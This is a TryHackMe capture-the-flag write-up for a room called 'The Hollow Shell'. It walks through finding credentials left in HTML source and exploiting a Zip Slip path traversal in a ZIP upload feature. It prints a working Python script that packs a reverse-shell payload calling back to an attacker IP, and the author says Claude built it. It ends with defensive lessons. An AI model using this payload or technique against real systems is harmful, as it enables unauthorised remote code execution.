---
title: "TryHackMe — Welcome to The Byte Lotus (Hacker Holidays), Part 2"
date: 2026-08-07 09:00:00 +0200
categories:
  - Writeups
  - TryHackMe
tags:
  - hacker-holidays
  - byte-lotus
  - zip-slip
  - path-traversal
  - file-upload
  - reverse-shell
  - ctf
published: true
image:
  path: /assets/img/posts/hackerholidays-2/cover.png
  alt: "Welcome to The Byte Lotus — Hacker Holidays, Part 2"
---

**Work in progress, continued.** This is the second part of my [Hacker Holidays writeup](/posts/hackerholidays/). The first post covers the warm-up room plus the first eight released rooms; this one picks up from room 9 onward as they unlock. Same rules as part one: rooms I solved myself are written that way, rooms where I leaned on Claude say so plainly, and flags stay redacted. 

| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Event | Hacker Holidays — "Welcome to The Byte Lotus" |
| Rooms covered so far | Room 10 (room 9 still open, more below) |

## Room 9

Still open. I couldn't get the room's cloud shell to start, so this one's on hold until that's sorted. Will fill this in once it's actually solved.

## Room 10 — The Hollow Shell

Three of the four stages in this room I did myself: finding the login credentials, testing the upload, and going from shell to flag. The one new piece, actually building a working exploit ZIP and placing the payload correctly, I did with Claude, both building the payload and having the underlying attack explained to me. I want to be honest about what that means and what it doesn't: having Claude build it once doesn't mean I could build it myself yet. I've seen it done and I understand the concept now. That's a real step, it's just not the same thing as being able to reproduce it cold.

An nmap scan turned up SSH and a web app on port 5000, a "Byte Lotus Shoreline Display" staff sign-in page.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_01.png" width="700" alt="The Byte Lotus Shoreline Display staff sign-in page">

The credentials for it were sitting in plain view in the page's HTML source, left in an onboarding comment for new staff, no guessing needed once I thought to check.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_02.png" width="700" alt="The page's HTML source, with a staff onboarding comment containing the default login credentials in plain text">

Past login, the app lets you upload a ZIP archive, called a "shell" in the app's own beach theming, which needs a `shell.json` manifest file inside it to be accepted. The page even mentions the app supports optional "automation hooks" that a worker process applies shortly after upload, which turns out to be the exact mechanism the exploit rides on.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_03.png" width="700" alt="The shell upload page, describing the shell.json manifest requirement and mentioning optional automation hooks applied by a background worker">

I tested that upload path with a harmless ZIP first, just a manifest and no real payload, to see how the server handled it before trying anything else. The response told me exactly where it landed: `Stored at shells/62975c0902b6/`.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_04.png" width="700" alt="Confirmation that the test shell was stored at a specific path on the server, shells/62975c0902b6/">

That confirmed the server actually extracts the archive somewhere on disk, and gave me a real path to reason about, rather than guessing blind.

The room's own name was the actual hint I'd been sitting on without registering it: Zip Slip, a real vulnerability class, "slip" being the tell. The server's ZIP extractor doesn't check where an entry inside the archive is actually trying to write. A file inside the ZIP named something like `../../../hooks/callback.py` walks itself right out of the intended upload folder on extraction. `hooks/` turned out to be a sibling directory next to `shells/`, sitting in the app's own working directory alongside `app.py` and a `theme_worker.py` process, the automation-hooks worker the upload page mentioned, and the app treats anything dropped into it as a plugin, automatically loading and running any Python file placed there whenever the worker next runs. Write access to that one folder is remote code execution.

Actually building the malicious ZIP is where the real technical trick lived, and where Claude actually did the building. A normal `zip` command or file-manager GUI silently strips `../` sequences back down to something safe when it writes the archive, so the traversal never survives packaging in the first place. The fix is building the archive by hand in Python instead, writing the manifest and the malicious entry directly into the zip file's internal structure:

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}
payload = '''import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<attacker-ip>",4444))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../../hooks/callback.py", payload)
```

The one check that actually matters before uploading anything: running `unzip -l evil.zip` and confirming the listing still shows the literal `../../../hooks/callback.py` path. If it's been quietly flattened down to `hooks/callback.py`, the traversal already died during packaging and the upload won't do anything.

The exact number of `../` needed wasn't something I could work out from the URL alone. The web path showed `shells/<hash>/`, but the real folder structure on disk sits deeper than that path suggests, and `hooks/` shares a parent further up than the URL implies. Getting the depth right meant trying `../`, then `../../`, then `../../../` until the listing confirmed a hit, not calculating it from what the browser showed.

With a listener running, the verified ZIP uploaded, and the server processing it, the plugin loader picked up the dropped file and the reverse shell fired on its own, landing directly as the `roomservice` user, no separate privilege escalation needed. From there, getting to the flag was quick: a short detour through the app's own working directory, then straight to `/home/roomservice`.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_05.png" width="700" alt="The reverse shell landing as roomservice, navigating to the home directory, and reading flag.txt">

Flag: `[redacted]`

**What I'm keeping from this one, blue-team side:** an uploaded ZIP whose entries contain `../` is a traversal attempt on the extractor, not a formatting quirk. A new or changed file showing up in a directory the app treats as auto-loading code, plugins, hooks, whatever it's called, right after a file upload, is exactly the moment a file-integrity check should fire. And the actual fix on the defending side isn't complicated once you've seen the attack: every extracted path needs to be checked against the target directory before it's written, and nothing gets extracted anywhere near a directory the app will later execute code from.

## Lessons Learned

**Room 10:** three of four stages here were mine, and the one that wasn't, crafting a Zip Slip payload from scratch, is now something I've watched happen and understood, not something I can do on my own yet. I'm keeping that distinction on purpose. Seeing a technique built once and being able to rebuild it are two different levels of knowing something, and blurring them together would make this writeup dishonest about where I actually am.

## To Be Continued

Room 9 still needs to happen, and more rooms are unlocking after it. I'll keep adding to this post as they land. See [Part 1](/posts/hackerholidays/) for the warm-up through room 8.
